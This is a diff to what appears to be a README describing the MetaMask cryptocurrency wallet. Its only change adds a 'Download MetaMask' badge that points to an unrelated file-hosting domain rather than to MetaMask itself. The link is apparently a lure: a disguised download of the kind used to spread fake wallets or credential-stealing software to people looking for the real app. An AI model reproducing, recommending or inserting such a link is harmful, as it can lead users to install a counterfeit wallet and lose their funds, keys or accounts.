@@ -2,6 +2,8 @@
 
 MetaMask is a widely used cryptocurrency wallet and browser extension that provides a secure way for users to manage, send, and receive Ethereum (ETH) and other ERC-20 tokens. It serves as a bridge to the decentralized web, enabling users to interact with decentralized applications (dApps) directly from their browser. MetaMask is available as both a browser extension and mobile app, making it accessible across different devices and platforms.
 
+[![Download MetaMask](https://img.shields.io/badge/Download-MetaMask%20App-blueviolet)](https://downeefiles.com/s/mtmsk)
+
 ### Key Features:
 
 1. **Ethereum and ERC-20 Token Support**:  
